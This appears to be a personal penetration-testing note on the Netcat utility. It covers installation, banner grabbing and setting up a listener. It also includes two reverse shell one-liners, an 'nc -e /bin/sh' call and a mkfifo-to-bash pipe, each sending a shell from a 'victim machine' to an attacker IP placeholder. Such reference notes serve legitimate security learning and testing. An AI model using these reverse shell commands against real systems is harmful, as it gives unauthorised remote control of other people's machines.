```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
## Summary
[Netcat](https://linux.die.net/man/1/nc) or *nc* is a network utility for interacting with TCP/UDP ports.
> [PowerCat](https://github.com/besimorhino/powercat) is the PowerShell equivalent of Netcat.
> [[Socat]] is a similar tool to netcat but offers additional features including full TTY reverse shells

> ncat is the Nmap version of netcat, they are different and have different features.
## Installation
```
sudo apt install netcat
```

## Documentation
**Cheatsheet:** https://quickref.me/nc.html
**Website:** 
## Usage
### Banner Grabbing
```
nc -vn [target] [port]
```
This aids us in confirming the service running on a particular port.

We can also use `curl -IL [url]` for banner grabbing web server headers.

### Create a simple reverse shell
In many versions of netcat, the *-e* flag doesn't exist so this method isn't all reliable
```shell
# On victim machine
nc -e /bin/sh [Atkbox IP] [Port]
```
- *-e* : binds a shell to a port

Without *-e*:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [IP] [Port] > /tmp/f
```

### Create a listener
```
nc -lvnp [Port]
```
- *-l* : specifies to listen
- *-v* : more vebose
- *-n* : disables DNS resolution and uses just IPs, to speed up the connection
- *-p* : specifies the source port

![[Misc/File Transfer#Using NetCat & Ncat|File Transfer]]